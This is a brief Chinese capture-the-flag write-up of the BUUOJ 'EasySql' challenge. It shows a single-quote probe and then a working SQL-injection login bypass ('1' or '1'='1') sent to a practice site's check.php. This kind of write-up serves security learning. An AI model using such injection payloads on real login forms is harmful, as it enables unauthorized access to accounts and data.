### buuoj_【极客大挑战 2019】EasySql

打开界面，是熟悉的味道，看题目直到这个问题是SQL注入

首先尝试下构造playload，看看能不能看出什么闭合

```
http://72034a47-7def-4778-830e-66a12c4e16b1.node4.buuoj.cn/check.php?username=admin&password=1%27
```

根据报错，可以看出是单引号闭合

![](https://pic.imgdb.cn/item/60f3c86f5132923bf801aee4.jpg)

然后试一下万能密码

```
http://72034a47-7def-4778-830e-66a12c4e16b1.node4.buuoj.cn/check.php?username=admin&password=1%27%20or%20%271%27=%271
```

![](https://pic.imgdb.cn/item/60f3c89a5132923bf8034b78.jpg)

成功了